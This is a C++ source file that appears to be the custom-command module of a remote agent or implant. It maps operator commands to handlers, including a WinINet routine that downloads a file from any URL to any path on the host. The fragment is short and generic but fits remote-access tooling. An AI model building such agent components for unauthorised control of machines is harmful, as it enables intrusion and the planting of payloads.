#include "custom_command.hpp"
#include <fstream>

std::map<std::string, std::function<void(const std::vector<std::string>&)>> my_map = {
	{ "Sleep", CustomSleepCmd },
	{ "Upload", Upload  }
};


void RegisterCommand(const std::string& name, std::function<void(const std::vector<std::string>&)> func) {
	my_map[name] = func;
}


std::vector<std::string> SplitArgs(const std::string& input) {
	std::stringstream ss(input);
	std::string arg;
	std::vector<std::string> args;
	while (ss >> arg) {
		args.push_back(arg);
	}
	return args;
}

void CustomSleepCmd(const std::vector<std::string>& args) {
	if (args.empty()) {
		std::cout << "Missing argument for Sleep\n";
		return;
	}
	MessageBoxA(NULL, "Mimiimimim", "Hollow", MB_ICONWARNING);
	unsigned int milliseconds = std::stoi(args[0]);

	if (milliseconds == 0) return;

	Sleep(milliseconds);
}

void Upload(const std::vector<std::string>& args) {
	//arg 0: URL qrg1: destination path 
	MessageBoxA(NULL, "IS working tkt", "Don't check the code until next year", MB_ICONWARNING);
	if (args.size() < 2) {
		std::cout << "Usage: Download <URL> <Destination Path>\n";
		return;
	}
	std::string url = args[0];
	std::string destPath = args[1];
	HINTERNET hInternet = InternetOpenA("Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInternet) {
		std::cout << "Failed to open internet connection\n";
		return;
	}

	HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (!hConnect) {
		std::cout << "Failed to open URL: " << url << "\n";
		InternetCloseHandle(hInternet);
		return;
	}
	DWORD bytesRead;
	std::ofstream outFile(destPath, std::ios::binary);
	if (!outFile) {
		std::cout << "Failed to open destination file: " << destPath << "\n";
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return;
	}
	char buffer[4096];
	while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
		outFile.write(buffer, bytesRead);
	}
	outFile.close();
	InternetCloseHandle(hConnect);
	
	
}

BOOL CustomCommand(const char* command, std::string* output) {
	if (command == nullptr || std::strlen(command) == 0) {
		return false;
	}

	std::string full_cmd(command);
	auto tokens = SplitArgs(full_cmd);

	if (tokens.empty()) return false;

	std::string cmd_name = tokens[0];
	tokens.erase(tokens.begin()); // remove command name

	auto it = my_map.find(cmd_name);
	if (it != my_map.end()) {
		it->second(tokens); // call with args
		return true;
	}
	else {
		std::cout << "Unknown command: " << cmd_name << "\n";
		return false;
	}
}